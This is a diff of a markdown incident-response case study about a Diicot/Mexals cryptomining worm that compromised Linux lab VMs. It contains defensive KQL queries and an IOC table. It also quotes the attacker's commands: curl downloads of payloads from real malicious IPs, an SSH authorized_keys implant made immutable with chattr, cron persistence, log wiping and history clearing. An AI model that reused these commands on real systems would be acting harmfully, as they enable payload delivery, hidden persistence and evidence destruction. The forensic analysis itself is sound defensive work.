@@ -1,17 +1,20 @@
-# Diicot _(aka Mexals)_ Cryptominer Worm Case Study | Full-System Linux Compromise
+# Diicot _(aka Mexals)_ Cryptominer Worm Infection Case Study <br> Full Linux-System Compromise at LOG(N)Pacific
+
 ## Report Information
 
-- **Analyst:** Justin Soflin  
-- **Date Completed:** Feb. 14, 2026  
-- **Environment Investigated:** Cyber Range at LOG(N) Pacific
-- **Malware Campaign Cluster:** Diicot _(fka Mexals)_
-- **Payload Type:** Cryptomining Worm
-- **Hosts Investigated:**  
-  - `linux-programmatic-fix-michael`  
-  - `linuxprogrammaticpabon`  
-- **User Context:** root | Unauthorized miner installation & persistence  
-- **Tools & Data Sources:** Microsoft Defender for Endpoint, Log Analytics Workspaces, KQL (Kusto Query Language), Linux audit logs  
-- **Scope:** Full-System Linux compromise, system-level execution, persistence analysis, malware delivery chain reconstruction, log tampering assessment, post compromise 
+| Category | Details |
+|----------|----------|
+| **Analyst** | Justin Soflin |
+| **Date Completed** | Feb. 14, 2026 |
+| **Environment Investigated** | Cyber Range at LOG(N) Pacific |
+| **Malware Campaign Cluster** | Diicot _(fka Mexals)_ |
+| **Payload Type** | Cryptomining Worm |
+| **Hosts Investigated** | `linux-programmatic-fix-michael`<br>`linuxprogrammaticpabon` |
+| **User Context** | `root` \| Unauthorized miner installation |
+| **Tools & Data Sources** | Microsoft Defender for Endpoint<br>Log Analytics Workspaces<br>KQL (Kusto Query Language)<br>Linux audit logs |
+| **Scope** | Full-System Linux compromise<br>Root-level execution<br>Persistence analysis<br>Malware delivery chain reconstruction<br>Log tampering assessment<br>Post-compromise investigation |
+
+<br>
 
 ---
 
@@ -69,7 +72,7 @@ The compromise occurred **less than 15 minutes** after the student updated crede
 
 <Br>
 
-<img width="1110" height="650" alt="image" src="https://github.com/user-attachments/assets/27845e1f-8f2a-4b5c-80d1-7168ce15ff6c" />
+<img width="1054" height="649" alt="image" src="https://github.com/user-attachments/assets/cfb25b9a-8cef-4cda-90c7-b2e705317aef" />
 
 <br>
 
@@ -77,11 +80,11 @@ The compromise occurred **less than 15 minutes** after the student updated crede
 
 # Incident Response Lifecycle
 
-### Preparation: Authentication Lab Context
+# Preparation: 
+
+### Authentication Lab Context
 
 At the time of compromise, the VM was actively being used for a **student lab exercise** designed to intentionally trigger findings for Tenable scans.
-
-**Students are instructed to destroy VM immediately after completion**
 
 <br>
 
@@ -96,6 +99,11 @@ Lab configuration included:
 
 <br>
 
+**Students are instructed to destroy VM asap when lab is finished** to avoid compromise <br>
+<img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />
+
+<br>
+
 ---
 
 ### NSG Rules for Cryptomining
@@ -103,10 +111,6 @@ Lab configuration included:
 - Outbound rules for _SSH_ and common crypto miner ports denied:
    - Ports 22, 3333, 4444, 5555, etc.
 - VMs can continue Root Labs without scanning outbound IPs, even if compromised
-
-  <br>
-
-  <img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
 
 <Br>
 
@@ -152,6 +156,8 @@ Lab configuration included:
 <br>
   
 ---
+
+# Analysis
 
 ### First Look Into Compromised Device
 
@@ -256,12 +262,14 @@ DeviceLogonEvents
 | order by TimeGenerated asc
 ```
 
+<br>
+
 **Student logs on at _1:35:55_ as _labuser_ via SSH**
 - Student begins lab, telnet install & update root password
 
  <br>
 
-<img width="1155" height="282" alt="image" src="https://github.com/user-attachments/assets/1ccd7da3-8463-4945-9079-bfa2fa9b7cd7" />
+<img width="1155" height="282" alt="image" src="https://github.com/user-attachments/assets/1ccd7da3-8463-4945-9079-bfa2fa9b7cd7" /> <br>
 
 <br>
 
@@ -269,7 +277,7 @@ DeviceLogonEvents
 
 <Br>
 
-<img width="1154" height="281" alt="image" src="https://github.com/user-attachments/assets/4c2f8d47-b748-4968-9725-d292e27fa7a7" />
+<img width="1154" height="281" alt="image" src="https://github.com/user-attachments/assets/4c2f8d47-b748-4968-9725-d292e27fa7a7" /> <br>
 
 <Br>
 
@@ -279,7 +287,7 @@ IP **successfully logs in** at _2:02_
 
 <br>
 
-<img width="1089" height="311" alt="image" src="https://github.com/user-attachments/assets/06958de7-721f-4657-b420-597eca2d52ba" />
+<img width="1089" height="311" alt="image" src="https://github.com/user-attachments/assets/06958de7-721f-4657-b420-597eca2d52ba" /> <br>
 
 <br>
 
@@ -360,11 +368,6 @@ DeviceFileEvents
 
  <br>
 
-**Students are instructed to destroy VM asap when lab is finished** to avoid compromise <br>
-<img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />
-
-<br>
-
 ---
 
 ### SSH Brute Force on Internal Subnet
@@ -375,7 +378,6 @@ DeviceFileEvents
    - Scan is looking for IPs that accept SSH connections, _Port 22_
    - If SSH is open, the malware tries common passwords for user accounts
      
-    <br>
    <br>
    
 **Password exerpt from _retea_ script**
@@ -427,12 +429,6 @@ root 123
    - Hide traces (clear logs, remove bash history)
 
 <br>
-
-- Brute Force IP: **129.212.178.38**
-   - Organization: DigitalOcean, LLC
-   - Cloud VPS provider, U.S.
-
-     <br>
      
 ---
 
@@ -504,7 +500,7 @@ rm -rf .bash_history ~/.bash_history
 
 ---
 
-### Root Cron Persistence
+### Persistence
 
 <br>
 
@@ -528,24 +524,119 @@ rm -rf .bash_history ~/.bash_history
 
      <br>
 
----
-     
-### .b4nd1d0 
-- a _leetspeak_ spelling of "Bandido" or "Bandit"
-- Known Malware Associations
-   - _.b4nd1d0_ has been observed in real Linux malware families in the wild
-   - It’s typically a secondary payload, backdoor, or helper binary
-   - Its consistent naming makes it easier for the malware’s cron scripts to find and execute it repeatedly
+**Crontab modification**
+- The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
+   - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
+   - malware will now run every 3 minutes
 
- <br>
- 
-<img width="1175" height="343" alt="image" src="https://github.com/user-attachments/assets/27adc996-b56a-4990-8b6d-688639596920" />
+   <br>
+
+   <img width="608" height="366" alt="image" src="https://github.com/user-attachments/assets/69f4d00b-3769-4bf3-9c9d-f52963e6c1ab" />
+
+   <br>
+
+**Startup services `/etc/init.d`**
+
+**`ygljglkjgfg0` is created/copied to _/etc/init.d/_** <br>
+- `/etc/init.d/` is used for startup services on Linux systems
+   - That means it would run automatically at boot
+- This confirms **intentional long-term persistence**. 
+
+<Br>
+
+```kql
+DeviceFileEvents  
+| where DeviceName == "linux-programmatic-fix-michael"  
+| where FolderPath startswith "/etc/init.d"  
+| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine
+| order by TimeGenerated desc  
+```
+
+<br>
+
+<img width="2017" height="430" alt="image" src="https://github.com/user-attachments/assets/bd2124e1-4894-453b-aeaf-3438736562fe" /> <br>
+
+<br>
+
+**SSH Key Implantation**
+
+<br>
+
+```
+chattr -ia ~/.ssh/authorized_keys  
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
+chattr +ai ~/.ssh/authorized_keys  
+```
+
+<br>
+
+_01/30_, day of compromise, actor set root password hash <br>
+_02/02_, actor adds their SSH public key to root's authorized_keys and makes the file immutable
+
+**Why do both?**
+   - Password-based backdoors can be changed or removed by system updates, resets, or admins
+   - Implantation ensures they can always log in via key, even if root password is changed later
+   - SSH key login may not generate password login attempts
+   - `chattr +ai` prevents even root from editing/deleting the key without first removing the immutable attribute
+   - Trivial fix for skilled linux users with root access
+   - Otherwise can delay remediation and prolong system infection 
+     
+<br>
+
+**Full command with annotations**
+```bash
+# --- Stage 1: Execute cleanup script ---
+chmod +x clean.sh                # Make clean.sh executable
+sh clean.sh                      # Run cleanup actions (likely remove temp files / old malware traces)
+rm -rf clean.sh                  # Delete script to remove evidence
+
+# --- Stage 2: Execute setup script ---
+chmod +x setup.sh                # Make setup.sh executable
+sh setup.sh                      # Run setup actions (likely prep malware staging directories)
+rm -rf setup.sh                  # Delete script to remove evidence
+
+# --- Stage 3: Create staging directory ---
+mkdir -p *******                  # Create folder for malware payloads or data
+
+# --- Stage 4: Prepare SSH for persistence ---
+chattr -ia ~/.ssh/authorized_keys # Remove immutable/append-only flags so file can be overwritten
+
+# --- Stage 5: Overwrite SSH authorized keys with attacker key ---
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... rsa-key-20230629" > ~/.ssh/authorized_keys
+
+# --- Stage 6: Protect attacker key from removal ---
+chattr +ai ~/.ssh/authorized_keys # Set immutable and append-only flags to prevent deletion or modification
+
+# --- Stage 7: System reconnaissance / reporting ---
+uname -a                          # Output system info (likely sent to attacker)
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" # Hex for "auth_ok" (signal success to C2)
+```
+
+<br>
+
+**What this script is doing:**
+   - Malware prepares environment (cleanup & setup scripts)
+   - Staging directory created for payloads
+   - SSH persistence established with attacker key
+   - SSH key is protected from modification or removal
+   - System info is exposed
+   - Signal sent to confirm successful compromise
+   - Student/root password changes are bypassed by attacker key
+
+**Outcome:**
+   - Full passwordless SSH access for attacker
+   - Persistent backdoor hard to remove
+   - Attacker added their own SSH key, alowing a silent login
+   - depending on how system logs SSH, standard login record might not generate
+   - This explains how the student wasn't booted: their account wasn’t actively interrupted
 
 <br>
 
 ---
 
-### Malicious Binary Download p.txt & r.txt
+### Malicious Binary Download
+
+**`p.txt` & `r.txt`**
 
 - `curl http://23DOT160DOT56DOT194/p.txt -o ygljglkjgfg0`
    - `p.txt` malicious **ELF binary** (named as _.txt_)
@@ -581,28 +672,10 @@ rm -rf .bash_history ~/.bash_history
    - Miner binaries
    - Remote control scripts
  
-   <br>
-
-<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
-
+  
 <Br>
 
-**Crontab modification**
-- The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
-   - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
-   - malware will now run every 3 minutes
-
-   <br>
-
-   <img width="608" height="366" alt="image" src="https://github.com/user-attachments/assets/69f4d00b-3769-4bf3-9c9d-f52963e6c1ab" />
-
-   <br>
-   
----
-
-### p.txt Variants
-
-- p.txt observations:
+- p.txt variants:
    - downloaded on two different devices
    - from same IP `23.160.56.194`
    - to the same file name `ygljglkjgfg`
@@ -636,8 +709,10 @@ rm -rf .bash_history ~/.bash_history
   - Log destruction  
 
 <br>
-
+   
 ---
+
+## Evasion:
 
 ### Binary Relocation and Renaming
 
@@ -742,7 +817,7 @@ exit $?                                         # Exit script returning last com
 
 ---
 
-## Running in Memory for "File-less" Execution
+### Running in Memory for "File-less" Execution
 
 Artifact tracking was hindered by frequent deletions, relocations, and renaming.
 
@@ -788,113 +863,10 @@ rm -rf /dev/shm/retea
      <br>
 
 ---
-     
-### Persistence via /etc/init.d
 
-**`ygljglkjgfg0` is created/copied to _/etc/init.d/_** <br>
-- `/etc/init.d/` is used for startup services on Linux systems
-   - That means it would run automatically at boot
-- This confirms **intentional long-term persistence**. 
+### Crypto Mining Worm
 
-<Br>
-
-```kql
-DeviceFileEvents  
-| where DeviceName == "linux-programmatic-fix-michael"  
-| where FolderPath startswith "/etc/init.d"  
-| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine
-| order by TimeGenerated desc  
-```
-
-<br>
-
-<img width="2017" height="430" alt="image" src="https://github.com/user-attachments/assets/bd2124e1-4894-453b-aeaf-3438736562fe" />
-
-<br>
-
----
-
-### SSH Key Implantation
-
-**A persistent SSH backdoor was implanted:**
-
-<br>
-
-```
-chattr -ia ~/.ssh/authorized_keys  
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
-chattr +ai ~/.ssh/authorized_keys  
-```
-
-<br>
-
-_01/30_, day of compromise, actor set root password hash <br>
-_02/02_, actor adds their SSH public key to root's authorized_keys and makes the file immutable
-
-**Why do both?**
-   - Password-based backdoors can be changed or removed by system updates, resets, or admins
-   - Implantation ensures they can always log in via key, even if root password is changed later
-   - SSH key login may not generate password login attempts
-   - `chattr +ai` prevents even root from editing/deleting the key without first removing the immutable attribute
-   - Trivial fix for skilled linux users with root access
-   - Otherwise can delay remediation and prolong system infection 
-     
-<br>
-
-**Full command with annotations**
-```bash
-# --- Stage 1: Execute cleanup script ---
-chmod +x clean.sh                # Make clean.sh executable
-sh clean.sh                      # Run cleanup actions (likely remove temp files / old malware traces)
-rm -rf clean.sh                  # Delete script to remove evidence
-
-# --- Stage 2: Execute setup script ---
-chmod +x setup.sh                # Make setup.sh executable
-sh setup.sh                      # Run setup actions (likely prep malware staging directories)
-rm -rf setup.sh                  # Delete script to remove evidence
-
-# --- Stage 3: Create staging directory ---
-mkdir -p *******                  # Create folder for malware payloads or data
-
-# --- Stage 4: Prepare SSH for persistence ---
-chattr -ia ~/.ssh/authorized_keys # Remove immutable/append-only flags so file can be overwritten
-
-# --- Stage 5: Overwrite SSH authorized keys with attacker key ---
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... rsa-key-20230629" > ~/.ssh/authorized_keys
-
-# --- Stage 6: Protect attacker key from removal ---
-chattr +ai ~/.ssh/authorized_keys # Set immutable and append-only flags to prevent deletion or modification
-
-# --- Stage 7: System reconnaissance / reporting ---
-uname -a                          # Output system info (likely sent to attacker)
-echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" # Hex for "auth_ok" (signal success to C2)
-```
-
-<br>
-
-**What this script is doing:**
-   - Malware prepares environment (cleanup & setup scripts)
-   - Staging directory created for payloads
-   - SSH persistence established with attacker key
-   - SSH key is protected from modification or removal
-   - System info is exposed
-   - Signal sent to confirm successful compromise
-   - Student/root password changes are bypassed by attacker key
-
-**Outcome:**
-   - Full passwordless SSH access for attacker
-   - Persistent backdoor hard to remove
-   - Attacker added their own SSH key, alowing a silent login
-   - depending on how system logs SSH, standard login record might not generate
-   - This explains how the student wasn't booted: their account wasn’t actively interrupted
-
-<br>
-
----
-
-### Crypto Mining Worm retea
-
-**Script reads in part:**
+**retea Script reads in part:**
 
 ```bash
 if key == [hardcoded string]
@@ -1092,13 +1064,43 @@ Miner
 # Containment, Eradication, & Recovery
 
 - Student's VM was destroyed on Feb. 03, five days after compromise
-- VM was confirmed to have conducted a subnet scan, but **no successful logins were observed**
+- VM was confirmed to have conducted 2 subnet scans, but **no successful logins were observed**
 - No evidence of actual cryptomining observed
 - No evidence of wallet id present in logs
+
+ <br>
+
+  <img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />
 
 ---
 
 #  Post-Event Activity (Lessons Learned)
+
+### Conclusion
+
+This incident represents a **full Linux system compromise** carried out by the automated **Diicot (_aka Mexals_) cryptomining worm**. The malware successfully exploited intentionally weak authentication settings during a student lab exercise, demonstrating how quickly exposed systems can be overtaken when real-world attack conditions are replicated.
+
+Less than **15 minutes** after the root password change, the host was compromised. The attacker achieved root-level execution, deployed obfuscated binaries, established multiple persistence mechanisms, cleared logs, and initiated internal SSH scanning. This type of attack can be financially devastating for victims — in 2022, Sysdig suggested that for every US$1 of cryptominer profit, the victim loses approximately US$53. Although no active cryptominer process was ultimately observed, the malware performed all preparatory actions consistent with staging a mining operation, including terminating any potential competing miners, tuning system limits for maximum resource consumption, and maintaining redundant access paths.
+
+The actor’s heavy use of renaming, deletion, in-memory execution, masking, and unintelligible filenames significantly complicated artifact continuity. This deliberate anti-forensic behavior made linear reconstruction difficult and highlights the operational maturity of the campaign. Microsoft Defender for Endpoint successfully detected malicious behavior early in the attack chain, enabling swift investigation and confirmation of compromise.
+
+Compared to the **April 2025 compromise**, the impact was materially reduced. Updated Network Security Group (NSG) outbound restrictions limited scanning to the internal subnet and prevented broader external propagation. This improved containment posture resulted in no escalations from Azure Safeguard Team. However, the successful internal SSH probing, as well as expected future student labs of this nature, demonstrates that additional inbound and lateral movement controls may be needed as **it seems the campaign continues to actively target the Cyber Range environment.**
+
+<br>
+
+## Key Takeaways
+
+- Exposed systems can be compromised within minutes
+- Weak authentication remains one of the most reliable initial access vectors
+- Cryptomining worms often operate as full frameworks, not just simple miners
+- Defense-in-depth significantly reduces impact
+- Even without sensitive data, compromised systems can be used for malicious purposes
+- Standard protocols alone may not be enough; layered monitoring and defenses are essential
+- Focusing on the broader compromise patterns can be as sufficient as examining every minor malware action
+
+  <br>
+
+---
 
 ### Immediate Recovery
 
@@ -1123,33 +1125,11 @@ Miner
 
 ---
 
-### Conclusion
+# Cryptominer Attack Chain Mappings
 
-This incident represents a **full Linux system compromise** carried out by the automated **Diicot (_aka Mexals_) cryptomining worm**. The malware successfully exploited intentionally weak authentication settings during a student lab exercise, demonstrating how quickly exposed systems can be overtaken when real-world attack conditions are replicated.
-
-Less than **15 minutes** after the root password change, the host was compromised. The attacker achieved root-level execution, deployed obfuscated binaries, established multiple persistence mechanisms, cleared logs, and initiated internal SSH scanning. Although no active cryptominer process was ultimately observed, the malware performed all preparatory actions consistent with staging a mining operation, including terminating any potential competing miners, tuning system limits for maximum resource consumption, and maintaining redundant access paths.
-
-The actor’s heavy use of renaming, deletion, in-memory execution, masking, and unintelligible filenames significantly complicated artifact continuity. This deliberate anti-forensic behavior made linear reconstruction difficult and highlights the operational maturity of the campaign. Microsoft Defender for Endpoint successfully detected malicious behavior early in the attack chain, enabling swift investigation and confirmation of compromise.
-
-Compared to the **April 2025 compromise**, the impact was materially reduced. Updated Network Security Group (NSG) outbound restrictions limited scanning to the internal subnet and prevented broader external propagation. This improved containment posture resulted in no escalations from Azure Safeguard Team. However, the successful internal SSH probing, as well as expected future student labs of this nature, demonstrates that additional inbound and lateral movement controls may be needed as **it seems the campaign continues to actively target the Cyber Range environment.**
+<img width="2592" height="1248" alt="image" src="https://github.com/user-attachments/assets/eaf829cd-2524-4946-9ac9-fe98a3179b5c" />
 
 <br>
-
-## Key Takeaways
-
-- Exposed systems can be compromised within minutes
-- Weak authentication remains one of the most reliable initial access vectors
-- Cryptomining worms often operate as full frameworks, not just simple miners
-- Defense-in-depth significantly reduces impact
-- Even without sensitive data, compromised systems can be used for malicious purposes
-- Standard protocols alone may not be enough; layered monitoring and defenses are essential
-- Focusing on the broader compromise patterns can be as sufficient as examining every minor malware action
-
-  <br>
-
----
-
-# Cryptominer Attack Chain Mappings
 
 | Kill Chain Step | Actions Observed | Script Evidence / Commands |
 |-----------------|-----------------|---------------------------|
@@ -1162,6 +1142,22 @@ Compared to the **April 2025 compromise**, the impact was materially reduced. Up
 | **Actions on Objectives** | Executes mining binaries; kills competing miners; tunes system resources; moves laterally; clears logs for stealth | `./.diicot &` <br> `./cache &` <br> `./payload &` <br> `pkill xmrig cnrig java` <br> `fs.file-max = 2097152` <br> `ulimit -n 99999` <br> `cat /dev/null > /var/log/*` <br> `history -c; rm -rf ~/.bash_history` |
 
   <br>
+
+  ## Malicious IPs Observed
+  
+ The malicious actor utilized multiple cloud service provider IPs to stage and download payload components. 
+
+ <br>
+
+| IP / Indicator | Port | File / Command Observed | IP Geolocation | Company | Company HQ Location | Company Type |
+|----------------|------|------------------------|----------------|---------|---------------------|--------------|
+| `109.206.236.18` | 42 | `./AHTKzAEv` → `/var/tmp/ahtkzaev` | Finland (FI) | CGI Global Limited | Hong Kong, HK | Cloud Service Provider / LIR |
+| `195.24.237.240` | 80 | `curl -s --connect-timeout 15 /.x/black3` | Netherlands (NL) | RIPE Network Coordination Centre | Amsterdam, Netherlands | Non-profit / Internet Registry (RIR) |
+| `52.223.13.41` | 80 | `curl digital.digitaldatainsights.org/.x/black3` | United States (US) | Amazon Web Services (AWS) | Seattle, WA, US | Cloud Service Provider |
+| `5.178.96.15` | 222 | `/tmp/cache` | Hong Kong (HK) | CGI Global Limited | Hong Kong, HK | Cloud Service Provider / LIR |
+| `23.160.56.194` | 80 | `curl http://23.160.56.194/p.txt -o ygljglkjgfg0` | United States (US) | HOST4NERD LLC | Albuquerque, NM, US | Hosting / ISP |
+| `123.136.95.225–228` | 1528 | `/usr/bin/ygljglkjgfg0` | China (CN) | NIU Telecommunications Inc | Shanghai, China | Telecommunications / ISP |
+| `185.196.10.217` | 443 | `/var/tmp/62651d33/abebe28a` | Seychelles (SC) | Global-Data System IT Corporation | Mahe, Seychelles | IT / Local Internet Registry (LIR) |
   
 ---
 
@@ -1193,10 +1189,20 @@ Compared to the **April 2025 compromise**, the impact was materially reduced. Up
 ---
 
 **Cyber Range targeted by malware again** _Jan. 30, 2026_
-- Compromised VM successfully scanned subnet _10.1.0.0/24:22_
+- Compromised VM successfully scanned subnet _10.1.0.0/24:22_ twice
    - No successful logins observed 
    - No outbound scans to public internet observed
-- No followup from Microsoft Azure Safeguard Team 
+- No followup from Microsoft Azure Safeguard Team, as no public IP addresses were scanned
 
 <br>
 
+---
+
+## Romanian Influence
+
+The Diicot/Mexals malware is widely documented
+- Some of the filenames are in Romanian:
+   - `b4nd1d0` a _leetspeak_ spelling of "Bandido" or "Bandit"
+   - `diicot` the malware's namesake is an acronym for the Direcția de Investigare a Infracțiunilor de Criminalitate Organizată și Terorism (Directorate for Investigating Organized Crime and Terrorism)
+   - `retea` literally translates to "Network"
+This naming convention suggests the original author of the code and/or users are Romanian in nature
